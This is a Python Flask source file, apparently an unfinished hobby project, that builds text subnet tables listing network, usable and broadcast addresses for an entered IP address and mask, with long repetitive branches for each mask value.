#Importing flask library and its method Flask to initiate Python based Server
#Importing method jsonify to format the return of JSON data in a human friendly format
#Importing method request to check for and parse payload of GET and POST requests to server
#Importing method abort to produce automatic Error handling response in HTML format
#Importing time function to store event times throughout function
#Importing sys to automatically exit program if certain errors received and output message related to error
#Importing os to access relable process kill Ubuntu internal directive
from flask import Flask, jsonify, request, abort, make_response
import time
import sys
import os


#Unneccesary legacy libraries datetime and re when initially performing time calculations in earlier versions
#Soon to be deprecated when all legacy variables will be removed
import datetime
import re


#Declaring chats array which will contain data for unexpired chat/ids which will be returned
chats = []
#Declaring expired_chats array which will hold expired chat/id data
expired_chats = []
#Declaring expiration_times_array which will hold the expiration times for the associated chat/ids
expiration_times_array = []
#Declare chats_username_array
chats_username_array = []
#Declare chats_username_expire_id_array
chats_username_expire_id_array = []



#Initiating Flask python server instance
app = Flask('__main__')



class return_subnet_table:
	def print_net_use_broad():
		#print('\n#', end='  | ')
		response += '\n#  | '
		#print('\t Network', end=' \t| ')
		response += '\t Network \t| '
		#print('\t\tUsable', end=' \t\t\t| ')
		response += '\t\tUsable \t\t\t| '
		#print('\tBroadcast')
		response += '\tBroadcast'
		#print('-----------------------------------------------------------------------------------------')
		response += '\n-----------------------------------------------------------------------------------------\n'
	
	def ip_input(self, ip, subnet_mask):
		global entered_ip_address, octets_for_entered_ip, changing_octets_for_ip, result_changing_octets_for_ip, entered_cidr_or_mask, ip_in_incorrect_format, octets_for_subnet_mask, subnet_network_row, use1Arr, use2Arr, broadArr, netArr, CIDRS, matchArr, counter, usable_addresses, response
		netArr = []
		use1Arr = []
		use2Arr = []
		broadArr = []
		matchArr = []
		
		
		response = ''
		response_array = []
		
		
		subnet_network_row = 0
		ip_in_incorrect_format = ''
		row_count = -1
		CIDRS = ['/8', '/9', '/10', '/11', '/12', '/13', '/14', '/15', '/16', '/17', '/18', '/19', '/20', '/21', '/22', '/23', '/24', '/25', '/26', '/27', '/28', '/29', '/30', '/31', '/32']
		MASKS = ['255.0.0.0', '255.128.0.0', '255.192.0.0', '255.224.0.0', '255.240.0.0', '255.248.0.0', '255.252.0.0', '255.254.0.0', '255.255.0.0', '255.255.128.0', '255.255.192.0', '255.255.224.0', '255.255.240.0', '255.255.248.0', '255.255.252.0', '255.255.254.0', '255.255.255.0', '255.255.255.128', '255.255.255.192', '255.255.255.224', '255.255.255.240', '255.255.255.248', '255.255.255.252', '255.255.255.254', '255.255.255.255']
		USABLES = [str((2**(32-8))-2), str((2**(32-9))-2), str((2**(32-10))-2), str((2**(32-11))-2), str((2**(32-12))-2), str((2**(32-13))-2), str((2**(32-14))-2), str((2**(32-15))-2), str((2**(32-16))-2), str((2**(32-17))-2), str((2**(32-18))-2), str((2**(32-19))-2), str((2**(32-20))-2), str((2**(32-21))-2), str((2**(32-22))-2), str((2**(32-23))-2), str((2**(32-24))-2), str((2**(32-25))-2), str((2**(32-26))-2), str((2**(32-27))-2), str((2**(32-28))-2), str((2**(32-29))-2), str((2**(32-30))-2), str((2**(32-31))-2), str((2**(32-32))-2)]
		entered_ip_address = ip
		#entered_ip_address = input('What IP address would you like to subnet?')
		octets_for_entered_ip = entered_ip_address.split('.')
		changing_octets_for_ip = entered_ip_address.split('.')
		if ((int(octets_for_entered_ip[0]) > 255) or (int(octets_for_entered_ip[0]) < 0) or (int(octets_for_entered_ip[1]) > 255) or (int(octets_for_entered_ip[1]) < 0) or (int(octets_for_entered_ip[2]) > 255) or (int(octets_for_entered_ip[2]) < 0) or (int(octets_for_entered_ip[3]) > 252) or (int(octets_for_entered_ip[3]) < 0) or (octets_for_entered_ip[0].isdigit() == False) or (octets_for_entered_ip[1].isdigit() == False) or (octets_for_entered_ip[2].isdigit() == False) or (octets_for_entered_ip[3].isdigit() == False)):
			#print('Error. Invalid Input\n\nReturning to Start...')
			response = 'Error. Invalid Input...'
			#return_subnet_table.ip_input()
		entered_cidr_or_mask = subnet_mask
		#entered_cidr_or_mask = input('What subnet mask or CIDR would you like?')
		if entered_cidr_or_mask[0] == '/' and entered_cidr_or_mask not in CIDRS:
			ip_in_incorrect_format = entered_cidr_or_mask
			entered_cidr_or_mask = ''
			#print('Error. Invalid Input\n\nReturning to Start...')
			response = 'Error. Invalid Input...'
			#return_subnet_table.ip_input()
		if entered_cidr_or_mask in CIDRS or entered_cidr_or_mask in MASKS:
			for i in range(len(CIDRS)):
				if entered_cidr_or_mask == CIDRS[i]:
					entered_cidr_or_mask = MASKS[i]
					usable_addresses = USABLES[i]
			for i in range(len(MASKS)):
				if entered_cidr_or_mask == MASKS[i]:
					usable_addresses = USABLES[i]
		octets_for_subnet_mask = entered_cidr_or_mask.split('.')
		if ((int(octets_for_subnet_mask[0]) > 255) or (int(octets_for_subnet_mask[0]) < 0) or (int(octets_for_subnet_mask[1]) > 255) or (int(octets_for_subnet_mask[1]) < 0) or (int(octets_for_subnet_mask[2]) > 255) or (int(octets_for_subnet_mask[2]) < 0) or (int(octets_for_subnet_mask[3]) > 252) or (int(octets_for_subnet_mask[3]) < 0) or (octets_for_subnet_mask[0].isdigit() == False) or (octets_for_subnet_mask[1].isdigit() == False) or (octets_for_subnet_mask[2].isdigit() == False) or (octets_for_subnet_mask[3].isdigit() == False)):
			#print('Error. Invalid Input\n\nReturning to Start...')
			response = 'Error. Invalid Input...'
			#return_subnet_table.ip_input()
		if octets_for_subnet_mask[0] != '255':
			#print('Error. Invalid Input\n\nReturning to Start...')
			response = 'Error. Invalid Input...'
			#return_subnet_table.ip_input()
		if octets_for_subnet_mask[0] == '255':
			if octets_for_subnet_mask[1] == '255':
				if octets_for_subnet_mask[2] == '255':
					if octets_for_subnet_mask[3] == '254' or int(octets_for_subnet_mask[3]) > 254:
						#print('\nCannot Subnet with given CIDR/Subnet Mask\n\nReturning to Start...')
						response = '\nCannot Subnet with given CIDR/Subnet Mask\n\n'
						#return_subnet_table.ip_input()
					if octets_for_subnet_mask[3] == '252':
						#return_subnet_table.print_net_use_broad()
						response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
						for i in range(0,256,4):
							netArr.append(i)
							use1Arr.append(i+1)
							use2Arr.append(i+2)
							broadArr.append(i+3)
							row_count += 1
							if (((int(octets_for_entered_ip[3])) - i >= 0)  and ((int(octets_for_entered_ip[3])) - (i+3) <= 0)):
								subnet_network_row = row_count
						for i in range(len(netArr)):
							changing_octets_for_ip[3] = str(netArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
							response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use1Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(' ', result_changing_octets_for_ip, end=' - ')
							response += ' '+result_changing_octets_for_ip+' - '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use2Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(result_changing_octets_for_ip, end='  \t| ')
							response += result_changing_octets_for_ip+'  \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(broadArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print('  ', result_changing_octets_for_ip)
							response += '  '+result_changing_octets_for_ip+'\n'
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
					if octets_for_subnet_mask[3] == '248':
						#return_subnet_table.print_net_use_broad()
						response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
						for i in range(0,256,8):
							netArr.append(i)
							use1Arr.append(i+1)
							use2Arr.append(i+6)
							broadArr.append(i+7)
							row_count += 1
							if (((int(octets_for_entered_ip[3])) - i >= 0)  and ((int(octets_for_entered_ip[3])) - (i+7) <= 0)):
								subnet_network_row = row_count
						for i in range(len(netArr)):
							changing_octets_for_ip[3] = str(netArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
							response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use1Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(' ', result_changing_octets_for_ip, end=' - ')
							response += ' '+result_changing_octets_for_ip+' - '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use2Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(result_changing_octets_for_ip, end='  \t| ')
							response += result_changing_octets_for_ip+'  \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(broadArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print('  ', result_changing_octets_for_ip)
							response += '  '+result_changing_octets_for_ip+'\n'
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
					if octets_for_subnet_mask[3] == '240':
						#return_subnet_table.print_net_use_broad()
						response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
						for i in range(0,256,16):
							netArr.append(i)
							use1Arr.append(i+1)
							use2Arr.append(i+14)
							broadArr.append(i+15)
							row_count += 1
							if (((int(octets_for_entered_ip[3])) - i >= 0)  and ((int(octets_for_entered_ip[3])) - (i+15) <= 0)):
								subnet_network_row = row_count
						for i in range(len(netArr)):
							changing_octets_for_ip[3] = str(netArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
							response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use1Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(' ', result_changing_octets_for_ip, end=' - ')
							response += ' '+result_changing_octets_for_ip+' - '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use2Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(result_changing_octets_for_ip, end='  \t| ')
							response += result_changing_octets_for_ip+'  \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(broadArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print('  ', result_changing_octets_for_ip)
							response += '  '+result_changing_octets_for_ip+'\n'
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
					if octets_for_subnet_mask[3] == '224':
						#return_subnet_table.print_net_use_broad()
						response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
						for i in range(0,256,32):
							netArr.append(i)
							use1Arr.append(i+1)
							use2Arr.append(i+30)
							broadArr.append(i+31)
							row_count += 1
							if (((int(octets_for_entered_ip[3])) - i >= 0)  and ((int(octets_for_entered_ip[3])) - (i+31) <= 0)):
								subnet_network_row = row_count
						for i in range(len(netArr)):
							changing_octets_for_ip[3] = str(netArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
							response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use1Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(' ', result_changing_octets_for_ip, end=' - ')
							response += ' '+result_changing_octets_for_ip+' - '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use2Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(result_changing_octets_for_ip, end='  \t| ')
							response += result_changing_octets_for_ip+'  \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(broadArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print('  ', result_changing_octets_for_ip)
							response += '  '+result_changing_octets_for_ip+'\n'
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
					if octets_for_subnet_mask[3] == '192':
						#return_subnet_table.print_net_use_broad()
						response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
						for i in range(0,256,64):
							netArr.append(i)
							use1Arr.append(i+1)
							use2Arr.append(i+62)
							broadArr.append(i+63)
							row_count += 1
							if (((int(octets_for_entered_ip[3])) - i >= 0)  and ((int(octets_for_entered_ip[3])) - (i+63) <= 0)):
								subnet_network_row = row_count
						for i in range(len(netArr)):
							changing_octets_for_ip[3] = str(netArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
							response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use1Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(' ', result_changing_octets_for_ip, end=' - ')
							response += ' '+result_changing_octets_for_ip+' - '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use2Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(result_changing_octets_for_ip, end='  \t| ')
							response += result_changing_octets_for_ip+'  \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(broadArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print('  ', result_changing_octets_for_ip)
							response += '  '+result_changing_octets_for_ip+'\n'
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
					if octets_for_subnet_mask[3] == '128':
						#return_subnet_table.print_net_use_broad()
						response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
						for i in range(0,256,128):
							netArr.append(i)
							use1Arr.append(i+1)
							use2Arr.append(i+126)
							broadArr.append(i+127)
							row_count += 1
							if (((int(octets_for_entered_ip[3])) - i >= 0)  and ((int(octets_for_entered_ip[3])) - (i+127) <= 0)):
								subnet_network_row = row_count
						for i in range(len(netArr)):
							changing_octets_for_ip[3] = str(netArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
							response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use1Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(' ', result_changing_octets_for_ip, end=' - ')
							response += ' '+result_changing_octets_for_ip+' - '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use2Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(result_changing_octets_for_ip, end='  \t| ')
							response += result_changing_octets_for_ip+'  \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(broadArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print('  ', result_changing_octets_for_ip)
							response += '  '+result_changing_octets_for_ip+'\n'
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
					if octets_for_subnet_mask[3] == '0':
						#return_subnet_table.print_net_use_broad()
						response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
						for i in range(0,256,256):
							netArr.append(i)
							use1Arr.append(i+1)
							use2Arr.append(i+254)
							broadArr.append(i+255)
							row_count += 1
							if (((int(octets_for_entered_ip[3])) - i >= 0)  and ((int(octets_for_entered_ip[3])) - (i+127) <= 0)):
								subnet_network_row = row_count
						for i in range(len(netArr)):
							changing_octets_for_ip[3] = str(netArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
							response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use1Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(' ', result_changing_octets_for_ip, end=' - ')
							response += ' '+result_changing_octets_for_ip+' - '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(use2Arr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print(result_changing_octets_for_ip, end='  \t| ')
							response += result_changing_octets_for_ip+'  \t| '
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
							changing_octets_for_ip[3] = str(broadArr[i])
							result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
							#print('  ', result_changing_octets_for_ip)
							response += '  '+result_changing_octets_for_ip+'\n'
							if i == subnet_network_row:
								matchArr.append(result_changing_octets_for_ip)
				if octets_for_subnet_mask[2] == '254' or int(octets_for_subnet_mask[3]) > 254:
					#print('\nCannot Subnet with given CIDR/Subnet Mask\n\nReturning to Start...')
					return_subnet_table.ip_input()
				if octets_for_subnet_mask[2] == '252':
					#return_subnet_table.print_net_use_broad()
					response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
					for i in range(0,256,4):
						netArr.append(i)
						use1Arr.append(i)
						use2Arr.append(i+3)
						broadArr.append(i+3)
						row_count += 1
						if (((int(octets_for_entered_ip[2])) - i >= 0)  and ((int(octets_for_entered_ip[2])) - (i+3) <= 0)):
							subnet_network_row = row_count
					for i in range(len(netArr)):
						changing_octets_for_ip[2] = str(netArr[i])
						changing_octets_for_ip[3] = str(0)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
						response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use1Arr[i])
						changing_octets_for_ip[3] = str(1)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(' ', result_changing_octets_for_ip, end=' - ')
						response += ' '+result_changing_octets_for_ip+' - '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use2Arr[i])
						changing_octets_for_ip[3] = str(254)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(result_changing_octets_for_ip, end='  \t| ')
						response += result_changing_octets_for_ip+'  \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(broadArr[i])
						changing_octets_for_ip[3] = str(255)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print('  ', result_changing_octets_for_ip)
						response += '  '+result_changing_octets_for_ip+'\n'
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
				if octets_for_subnet_mask[2] == '248':
					#return_subnet_table.print_net_use_broad()
					response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
					for i in range(0,256,8):
						netArr.append(i)
						use1Arr.append(i)
						use2Arr.append(i+7)
						broadArr.append(i+7)
						row_count += 1
						if (((int(octets_for_entered_ip[2]))- i >= 0)  and ((int(octets_for_entered_ip[2])) - (i+7) <= 0)):
							subnet_network_row = row_count
					for i in range(len(netArr)):
						changing_octets_for_ip[2] = str(netArr[i])
						changing_octets_for_ip[3] = str(0)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
						response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use1Arr[i])
						changing_octets_for_ip[3] = str(1)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(' ', result_changing_octets_for_ip, end=' - ')
						response += ' '+result_changing_octets_for_ip+' - '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use2Arr[i])
						changing_octets_for_ip[3] = str(254)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(result_changing_octets_for_ip, end='  \t| ')
						response += result_changing_octets_for_ip+'  \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(broadArr[i])
						changing_octets_for_ip[3] = str(255)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print('  ', result_changing_octets_for_ip)
						response += '  '+result_changing_octets_for_ip+'\n'
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
				if octets_for_subnet_mask[2] == '240':
					#return_subnet_table.print_net_use_broad()
					response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
					for i in range(0,256,16):
						netArr.append(i)
						use1Arr.append(i)
						use2Arr.append(i+15)
						broadArr.append(i+15)
						row_count += 1
						if (((int(octets_for_entered_ip[2])) - i >= 0)  and ((int(octets_for_entered_ip[2])) - (i+15) <= 0)):
							subnet_network_row = row_count
					for i in range(len(netArr)):
						changing_octets_for_ip[2] = str(netArr[i])
						changing_octets_for_ip[3] = str(0)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
						response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use1Arr[i])
						changing_octets_for_ip[3] = str(1)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(' ', result_changing_octets_for_ip, end=' - ')
						response += ' '+result_changing_octets_for_ip+' - '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use2Arr[i])
						changing_octets_for_ip[3] = str(254)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(result_changing_octets_for_ip, end='  \t| ')
						response += result_changing_octets_for_ip+'  \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(broadArr[i])
						changing_octets_for_ip[3] = str(255)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print('  ', result_changing_octets_for_ip)
						response += '  '+result_changing_octets_for_ip+'\n'
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
				if octets_for_subnet_mask[2] == '224':
					#return_subnet_table.print_net_use_broad()
					response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
					for i in range(0,256,32):
						netArr.append(i)
						use1Arr.append(i)
						use2Arr.append(i+31)
						broadArr.append(i+31)
						row_count += 1
						if (((int(octets_for_entered_ip[2])) - i >= 0)  and ((int(octets_for_entered_ip[2])) - (i+31) <= 0)):
							subnet_network_row = row_count
					for i in range(len(netArr)):
						changing_octets_for_ip[2] = str(netArr[i])
						changing_octets_for_ip[3] = str(0)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
						response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use1Arr[i])
						changing_octets_for_ip[3] = str(1)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(' ', result_changing_octets_for_ip, end=' - ')
						response += ' '+result_changing_octets_for_ip+' - '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use2Arr[i])
						changing_octets_for_ip[3] = str(254)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(result_changing_octets_for_ip, end='  \t| ')
						response += result_changing_octets_for_ip+'  \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(broadArr[i])
						changing_octets_for_ip[3] = str(255)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print('  ', result_changing_octets_for_ip)
						response += '  '+result_changing_octets_for_ip+'\n'
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
				if octets_for_subnet_mask[2] == '192':
					#return_subnet_table.print_net_use_broad()
					response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
					for i in range(0,256,64):
						netArr.append(i)
						use1Arr.append(i)
						use2Arr.append(i+63)
						broadArr.append(i+63)
						row_count += 1
						if (((int(octets_for_entered_ip[2])) - i >= 0)  and ((int(octets_for_entered_ip[2])) - (i+63) <= 0)):
							subnet_network_row = row_count
					for i in range(len(netArr)):
						changing_octets_for_ip[2] = str(netArr[i])
						changing_octets_for_ip[3] = str(0)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
						response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use1Arr[i])
						changing_octets_for_ip[3] = str(1)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(' ', result_changing_octets_for_ip, end=' - ')
						response += ' '+result_changing_octets_for_ip+' - '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use2Arr[i])
						changing_octets_for_ip[3] = str(254)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(result_changing_octets_for_ip, end='  \t| ')
						response += result_changing_octets_for_ip+'  \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(broadArr[i])
						changing_octets_for_ip[3] = str(255)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print('  ', result_changing_octets_for_ip)
						response += '  '+result_changing_octets_for_ip+'\n'
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
				if octets_for_subnet_mask[2] == '128':
					#return_subnet_table.print_net_use_broad()
					response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
					for i in range(0,256,128):
						netArr.append(i)
						use1Arr.append(i)
						use2Arr.append(i+127)
						broadArr.append(i+127)
						row_count += 1
						if (((int(octets_for_entered_ip[2])) - i >= 0)  and ((int(octets_for_entered_ip[2])) - (i+127) <= 0)):
							subnet_network_row = row_count
					for i in range(len(netArr)):
						changing_octets_for_ip[2] = str(netArr[i])
						changing_octets_for_ip[3] = str(0)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
						response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use1Arr[i])
						changing_octets_for_ip[3] = str(1)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(' ', result_changing_octets_for_ip, end=' - ')
						response += ' '+result_changing_octets_for_ip+' - '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use2Arr[i])
						changing_octets_for_ip[3] = str(254)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(result_changing_octets_for_ip, end='  \t| ')
						response += result_changing_octets_for_ip+'  \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(broadArr[i])
						changing_octets_for_ip[3] = str(255)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print('  ', result_changing_octets_for_ip)
						response += '  '+result_changing_octets_for_ip+'\n'
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
				if octets_for_subnet_mask[2] == '0':
					#return_subnet_table.print_net_use_broad()
					response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
					for i in range(0,256,256):
						netArr.append(i)
						use1Arr.append(i)
						use2Arr.append(i+255)
						broadArr.append(i+255)
						row_count += 1
						if (((int(octets_for_entered_ip[2])) - i >= 0)  and ((int(octets_for_entered_ip[2])) - (i+255) <= 0)):
							subnet_network_row = row_count
					for i in range(len(netArr)):
						changing_octets_for_ip[2] = str(netArr[i])
						changing_octets_for_ip[3] = str(0)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
						response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use1Arr[i])
						changing_octets_for_ip[3] = str(1)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(' ', result_changing_octets_for_ip, end=' - ')
						response += ' '+result_changing_octets_for_ip+' - '
